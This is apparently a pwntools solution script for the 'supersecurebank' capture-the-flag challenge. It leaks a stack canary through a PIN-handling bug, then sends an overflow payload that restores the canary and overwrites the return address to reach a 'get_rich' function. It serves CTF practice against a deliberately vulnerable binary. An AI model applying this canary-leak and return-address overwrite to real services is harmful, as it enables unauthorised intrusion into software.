from pwn import *

exe = context.binary = ELF("supersecurebank")
HOST = "super-secure-bank.challs.olicyber.it"
PORT = 38080

if args.REMOTE:
    r = remote(HOST, PORT)
else:
    r = process()

win_addr = exe.symbols["get_rich"]

pin = b"1" * 4 + b"0" + b"0" * 3 + b"\n"

r.recvuntil(b"ice: ")
r.sendline(b"1")
r.recvuntil(b"): ")
r.sendline(b"12")
r.recvuntil(b"pin: ")
r.send(pin)

r.recvuntil(b": " + pin[:-1] + b"\n")
canary_leak = r.recvuntil(b"Insert your bank name", drop=True)
canary = b"\x00" + canary_leak[:7]
log.success(f"Canary: {hex(u64(canary))}")

payload  = b"A" * 24
payload += canary
payload += b"A" * 8
payload += p64(win_addr)
assert len(payload) == 0x30

r.recvuntil(b": ")
r.send(payload)

r.interactive()